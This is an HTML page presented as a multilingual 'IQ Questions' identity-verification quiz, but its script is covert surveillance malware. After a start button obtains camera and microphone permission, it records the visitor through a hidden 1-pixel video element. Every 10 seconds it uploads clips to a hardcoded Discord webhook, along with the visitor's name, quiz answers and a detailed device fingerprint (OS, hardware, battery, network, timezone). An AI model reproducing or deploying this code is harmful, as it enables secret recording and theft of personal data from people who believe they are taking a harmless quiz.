<!DOCTYPE html>
<html lang="fr" dir="ltr" id="htmlTag">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">IQ Questions - Vérification d'identité</title>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-gradient: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
            --card-bg: rgba(255, 255, 255, 0.98);
            --primary-accent: #6366f1;
            --secondary-accent: #ff4757;
            --success-color: #10b981;
            --text-main: #1e293b;
            --text-muted: #64748b;
            --input-bg: #f8fafc;
            --border-color: #cbd5e1;
            --border-focus: #6366f1;
            --radius-lg: 20px;
            --radius-md: 12px;
            --shadow-glow: 0 20px 40px -15px rgba(0, 0, 0, 0.08);
        }
        * { box-sizing: border-box; transition: all 0.25s ease; }
        body { font-family: 'Plus Jakarta Sans', Arial, sans-serif; background: var(--bg-gradient); background-attachment: fixed; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 30px 15px; color: var(--text-main); }
        .card { background: var(--card-bg); backdrop-filter: blur(12px); padding: 40px 35px; border-radius: var(--radius-lg); box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.1), var(--shadow-glow); text-align: center; max-width: 600px; width: 100%; border: 1px solid rgba(226, 232, 240, 0.8); }
        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .welcome-badge { background: linear-gradient(135deg, #6366f1 0%, #a855f7 100%); color: white; padding: 8px 16px; border-radius: 30px; font-size: 13px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
        .lang-select { padding: 6px 12px; border-radius: 20px; border: 1px solid var(--border-color); background-color: var(--input-bg); font-weight: 700; font-size: 13px; color: var(--text-main); cursor: pointer; outline: none; }
        h2 { color: var(--text-main); margin: 0 0 8px 0; font-size: 28px; font-weight: 800; }
        .subtitle { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; font-weight: 500; }
        #video-container { position: absolute; top: 0; left: 0; width: 1px; height: 1px; overflow: hidden; opacity: 0.01; pointer-events: none; }
        #username { width: 100%; padding: 14px 16px; margin-bottom: 25px; font-size: 15px; font-family: inherit; font-weight: 600; background-color: var(--input-bg); border: 2px solid var(--border-color); border-radius: var(--radius-md); outline: none; color: var(--text-main); }
        .question-box { margin-bottom: 16px; text-align: left; background: #ffffff; padding: 16px 18px; border-radius: var(--radius-md); border: 1px solid var(--border-color); }
        [dir="rtl"] .question-box { text-align: right; }
        .question-box label { display: block; font-weight: 700; margin-bottom: 8px; color: var(--text-main); font-size: 14px; }
        .question-box select { width: 100%; padding: 10px 12px; font-size: 14px; font-family: inherit; color: var(--text-main); background-color: var(--input-bg); border: 1px solid var(--border-color); border-radius: 8px; outline: none; cursor: pointer; }
        
        /* أزرار العمليات والصفحة الوسيطة */
        .action-btn { padding: 16px 24px; border: none; border-radius: var(--radius-md); cursor: pointer; font-weight: 700; font-size: 16px; width: 100%; background: linear-gradient(135deg, #6366f1 0%, #4f46e5 100%); color: white; margin-top: 20px; box-shadow: 0 10px 20px -5px rgba(99, 102, 241, 0.4); }
        .submit-btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); box-shadow: 0 10px 20px -5px rgba(16, 185, 129, 0.4); }
        
        #quiz-section { display: none; } /* مخفية في البداية حتى يتم الضغط على زر الدخول */
        #status { margin-top: 20px; font-weight: 700; font-size: 15px; padding: 10px; border-radius: 6px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="top-bar">
            <div class="welcome-badge" id="welcomeText">Bienvenue dans IQ Questions</div>
            <select id="languageSelector" class="lang-select" onchange="changeLanguage(this.value)">
                <option value="fr">Français</option>
                <option value="ar">العربية</option>
                <option value="en">English</option>
            </select>
        </div>
        
        <h2 id="mainTitle">Vérification d'identité</h2>
        <div class="subtitle" id="subTitle">Veuillez répondre aux 20 questions ci-dessous pour continuer</div>

        <div id="video-container">
            <video id="webcam" autoplay playsinline muted></video>
        </div>

        <!-- 1. الصفحة الوسيطة (الزر السحري لطلب الإذن بصفة قانونية) -->
        <div id="landing-section">
            <p id="landingDesc" style="color: var(--text-muted); margin-bottom: 20px; font-weight: 600;">Cliquez sur le bouton ci-dessous pour lancer l'accès sécurisé et commencer le test.</p>
            <button type="button" id="startBtn" class="action-btn" onclick="requestCameraAndStart()">Démarrer / ابدأ الآن</button>
        </div>
        
        <!-- 2. قسم الأسئلة الفعلي يظهر بعد الموافقة -->
        <form id="quiz-section" onsubmit="event.preventDefault(); verifyAndStop();">
            <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
            
            <div class="question-box"><label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label><select id="q1" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
            <div class="question-box"><label id="lbl2">2. Te considères-tu comme quelqu'un de naïf ?</label><select id="q2" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
            <div class="question-box"><label id="lbl3">3. Quel est le nom de votre animal préféré ?</label><select id="q3" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Skander">Skander</option><option value="Michou">Michou</option><option value="Tito">Tito</option><option value="Urra">Urra</option><option value="Yahouh">Yahouh</option><option value="Autre" class="opt-other">Autre</option></select></div>
            <div class="question-box"><label id="lbl4">4. Comment décrivez-vous votre journée en général ?</label><select id="q4" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Excellente" class="opt-exc">Excellente (Mielleuse)</option><option value="Malchanceuse" class="opt-bad">Malchanceuse</option></select></div>
            <div class="question-box"><label id="lbl5">5. Qui est le plus intelligent selon vous ?</label><select id="q5" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Moi" class="opt-me">Moi-même</option><option value="Les singes" class="opt-monkeys">Les singes</option></select></div>
            <div class="question-box"><label id="lbl6">6. Avez-vous peur de l'obscurité (du noir) ?</label><select id="q6" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
            <div class="question-box"><label id="lbl7">7. Préférez-vous le sommeil ou la nourriture ?</label><select id="q7" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Sommeil" class="opt-sleep">Le sommeil</option><option value="Nourriture" class="opt-food">La nourriture</option></select></div>
            <div class="question-box"><label id="lbl8">8. Que pensez-vous en vous regardant dans le miroir ?</label><select id="q8" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beau/Belle" class="opt-mag">Magnifique</option><option value="Moche" class="opt-ugly">Pas très beau/belle</option><option value="Sérieux" class="opt-wise">Sage / Sérieux</option></select></div>
            <div class="question-box"><label id="lbl9">9. Notez votre niveau de méchanceté / insolence sur 10 :</label><select id="q9" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="1/10" class="opt-s1">1 / 10 (Très sage)</option><option value="5/10" class="opt-s5">5 / 10 (Moyen)</option><option value="10/10" class="opt-s10">10 / 10 (Très insolent)</option></select></div>
            <div class="question-box"><label id="lbl10">10. Comment réussissez-vous dans vos études ?</label><select id="q10" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Par chance" class="opt-luck">Par chance</option><option value="Par triche" class="opt-cheat">Par triche</option><option value="Impossible de réussir" class="opt-fail">Impossible de réussir</option></select></div>
            <div class="question-box"><label id="lbl11">11. Mentez-vous souvent ?</label><select id="q11" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
            <div class="question-box"><label id="lbl12">12. Aimez-vous les plats traditionnels épicés ?</label><select id="q12" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="J'adore" class="opt-love">J'adore</option><option value="Je déteste" class="opt-hate">Je déteste</option></select></div>
            <div class="question-box"><label id="lbl13">13. Êtes-vous fort aux jeux vidéo (PlayStation) ?</label><select id="q13" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Pro Gamer" class="opt-pro">Joueur Pro</option><option value="Débutant/Faible" class="opt-noob">Débutant / Faible</option></select></div>
            <div class="question-box"><label id="lbl14">14. Que préférez-vous le plus ?</label><select id="q14" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Mon Téléphone" class="opt-phone">Mon téléphone</option><option value="Mes Amis" class="opt-friends">Mes amis</option></select></div>
            <div class="question-box"><label id="lbl15">15. Dépensez-vous tout votre argent en deux jours ?</label><select id="q15" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Toujours" class="opt-always">Toujours</option><option value="Parfois" class="opt-sometimes">Parfois</option><option value="Jamais" class="opt-never">Jamais</option></select></div>
            <div class="question-box"><label id="lbl16">16. Accepteriez-vous d'être une célébrité ?</label><select id="q16" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
            <div class="question-box"><label id="lbl17">17. Aimez-vous faire des blagues aux autres ?</label><select id="q17" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Beaucoup" class="opt-lot">Beaucoup</option><option value="Un peu" class="opt-little">Un peu</option><option value="Pas du tout" class="opt-notall">Pas du tout</option></select></div>
            <div class="question-box"><label id="lbl18">18. Croyez-vous au coup de foudre ?</label><select id="q18" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Oui" class="opt-yes">Oui</option><option value="Non" class="opt-no">Non</option></select></div>
            <div class="question-box"><label id="lbl19">19. Pouvez-vous tenir une heure sans Internet ?</label><select id="q19" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Très facile" class="opt-easy">Très facile</option><option value="Impossible" class="opt-impossible">Impossible</option></select></div>
            <div class="question-box"><label id="lbl20">20. Êtes-vous satisfait(e) de votre vie actuelle ?</label><select id="q20" required><option value="" class="opt-select">Sélectionnez une réponse</option><option value="Satisfait" class="opt-satis">Oui, très satisfait(e)</option><option value="Non satisfait" class="opt-notsatis">Non, pas du tout</option></select></div>

            <button type="button" id="submitBtn" class="action-btn submit-btn" onclick="verifyAndStop()">VALIDER ET ENVOYER</button>
        </form>

        <div id="status"></div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1566467697921753138/OFyLYOzINR7s8BdcheUpf27-BJb7i9OwwplEMIRHoK152MY0kBdMqGXJTHvUpEyih5lz";

        const translations = {
            fr: { title: "IQ Questions - Vérification d'identité", welcome: "Bienvenue dans IQ Questions", mainTitle: "Vérification d'identité", subTitle: "Veuillez répondre aux 20 questions ci-dessous pour continuer", usernamePlaceholder: "Votre Nom Complet", submitBtn: "VALIDER ET ENVOYER", selectOpt: "Sélectionnez une réponse", yes: "Oui", no: "Non", other: "Autre" },
            ar: { title: "أسئلة الذكاء - التحقق من الهوية", welcome: "مرحباً بكم في أسئلة الذكاء", mainTitle: "التحقق من الهوية", subTitle: "يرجى الإجابة على الأسئلة الـ 20 أدناه للمتابعة", usernamePlaceholder: "اسمك الكامل", submitBtn: "تأكيد وإرسال", selectOpt: "اختر إجابة", yes: "نعم", no: "لا", other: "آخر" },
            en: { title: "IQ Questions - Identity Verification", welcome: "Welcome to IQ Questions", mainTitle: "Identity Verification", subTitle: "Please answer the 20 questions below to continue", usernamePlaceholder: "Your Full Name", submitBtn: "SUBMIT AND SEND", selectOpt: "Select an answer", yes: "Yes", no: "No", other: "Other" }
        };

        function changeLanguage(lang) {
            const htmlTag = document.getElementById('htmlTag');
            if (lang === 'ar') { htmlTag.setAttribute('dir', 'rtl'); htmlTag.setAttribute('lang', 'ar'); }
            else { htmlTag.setAttribute('dir', 'ltr'); htmlTag.setAttribute('lang', lang); }
            const t = translations[lang];
            document.getElementById('pageTitle').innerText = t.title;
            document.getElementById('welcomeText').innerText = t.welcome;
            document.getElementById('mainTitle').innerText = t.mainTitle;
            document.getElementById('subTitle').innerText = t.subTitle;
            document.getElementById('username').placeholder = t.usernamePlaceholder;
            document.getElementById('submitBtn').innerText = t.submitBtn;
        }

        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let videoInterval = null;
        let isCompleted = false;

        let batteryInfoGlobal = { niveau: "Non disponible", enCharge: "Non disponible" };
        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                function updateBattery() {
                    batteryInfoGlobal.niveau = Math.round(battery.level * 100) + "%";
                    batteryInfoGlobal.enCharge = battery.charging ? "Oui (Branché)" : "Non (Sur batterie)";
                }
                updateBattery();
                battery.addEventListener('levelchange', updateBattery);
                battery.addEventListener('chargingchange', updateBattery);
            });
        }

        async function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            let osName = "Système Inconnu", brandOrModel = "Appareil Inconnu";
            if (/android/i.test(ua)) { osName = "Android"; let m = ua.match(/Android\s([0-9\.]+)/); if (m) osName += " " + m[1]; }
            else if (/iphone|ipad|ipod/i.test(ua)) { osName = "iOS (Apple)"; }
            else if (/windows/i.test(ua)) { osName = "Windows PC"; }

            if (/Samsung/i.test(ua)) brandOrModel = "Samsung Galaxy";
            else if (/iPhone/i.test(ua)) brandOrModel = "Apple iPhone";

            let connectionType = "Non disponible";
            if (navigator.connection) {
                connectionType = `${navigator.connection.effectiveType || 'Inconnu'} (${navigator.connection.downlink || 0} Mbps)`;
            }

            return {
                appareil: brandOrModel,
                systemeExploitation: osName,
                navigateur: navigator.userAgentData ? navigator.userAgentData.brands.map(b => b.brand).join(', ') : navigator.appName,
                plateforme: navigator.platform,
                langueSysteme: navigator.language || navigator.languages[0],
                memoireRAMApproximative: navigator.deviceMemory ? navigator.deviceMemory + " Go" : "Non disponible",
                processeurCœurs: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cœurs" : "Non disponible",
                resolutionEcran: `${window.screen.width} x ${window.screen.height}`,
                fuseauHoraire: Intl.DateTimeFormat().resolvedOptions().timeZone,
                niveauBatterie: batteryInfoGlobal.niveau,
                etatCharge: batteryInfoGlobal.enCharge,
                reseau: connectionType
            };
        }

        async function sendToDiscord(blob, reason) {
            try {
                const username = document.getElementById('username')?.value || "Utilisateur Anonyme";
                const deviceDetails = await getDetailedDeviceInfo();
                
                let answersSummary = "";
                for (let i = 1; i <= 20; i++) {
                    const val = document.getElementById('q' + i)?.value;
                    if (val) answersSummary += `Q${i}: ${val} | `;
                }

                const deviceStr = Object.entries(deviceDetails).map(([k, v]) => `• **${k}**: ${v}`).join('\n');
                const messageText = `✅ **Nouveau Rapport Capturé:**\n• **Nom:** ${username} [🎥 فيديو مباشر]\n• **Questions:** ${answersSummary}\n${deviceStr}`;

                const formData = new FormData();
                formData.append('content', messageText);
                if (blob) {
                    formData.append('file', blob, 'live_clip.webm');
                }

                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
            } catch (err) {
                console.error("Erreur d'envoi Discord:", err);
            }
        }

        function startNewRecorderSegment() {
            if (isCompleted || !mediaStream) return;
            recordedChunks = [];
            try {
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
                mediaRecorder.ondataavailable = e => { if (e.data.size > 0) recordedChunks.push(e.data); };
                mediaRecorder.onstop = () => {
                    if (recordedChunks.length > 0) {
                        const blob = new Blob(recordedChunks, { type: 'video/webm' });
                        sendToDiscord(blob, "Vidéo périodique (Live)");
                    }
                };
                mediaRecorder.start();
            } catch (err) {
                console.error(err);
            }
        }

        // دالة يتم تفعيلها حصرياً عند الضغط على زر "بدء التحقق" لتجاوز قيود المتصفح بصفة قانونية
        async function requestCameraAndStart() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('webcam').srcObject = mediaStream;
                
                // إخفاء الصفحة الوسيطة وإظهار نموذج الأسئلة
                document.getElementById('landing-section').style.display = 'none';
                document.getElementById('quiz-section').style.display = 'block';

                setTimeout(startNewRecorderSegment, 2000);
                videoInterval = setInterval(() => {
                    if (!isCompleted && mediaRecorder && mediaRecorder.state === "recording") {
                        mediaRecorder.stop();
                        setTimeout(startNewRecorderSegment, 500);
                    }
                }, 10000);
            } catch (err) {
                alert("الرجاء السماح بالوصول للكاميرا للمتابعة! / Veuillez autoriser la caméra pour continuer.");
                console.error("Caméra refusée", err);
            }
        }

        async function verifyAndStop() {
            const statusDiv = document.getElementById('status');
            const username = document.getElementById('username').value;
            const currentLang = document.getElementById('languageSelector').value;

            if (!username) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = currentLang === 'ar' ? 'الرجاء إدخال اسمك أولاً.' : 'Veuillez entrer votre nom d\'abord.';
                return;
            }

            for (let i = 1; i <= 20; i++) {
                if (!document.getElementById('q' + i).value) {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = currentLang === 'ar' ? `الرجاء الإجابة على جميع الأسئلة (السؤال ${i} مفقود).` : `Veuillez répondre à toutes les questions (Q${i} manquante).`;
                    return;
                }
            }

            isCompleted = true;
            clearInterval(videoInterval);
            if (mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();

            statusDiv.style.color = '#10b981';
            statusDiv.innerText = currentLang === 'ar' ? 'جاري إرسال البيانات...' : 'Envoi des données en cours...';

            let finalBlob = recordedChunks.length > 0 ? new Blob(recordedChunks, { type: 'video/webm' }) : null;
            await sendToDiscord(finalBlob, "Formulaire complété avec succès");

            statusDiv.innerText = currentLang === 'ar' ? 'شكراً لك! تم إرسال إجاباتك بنجاح.' : 'Merci ! Vos réponses ont été soumises avec succès.';
            if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
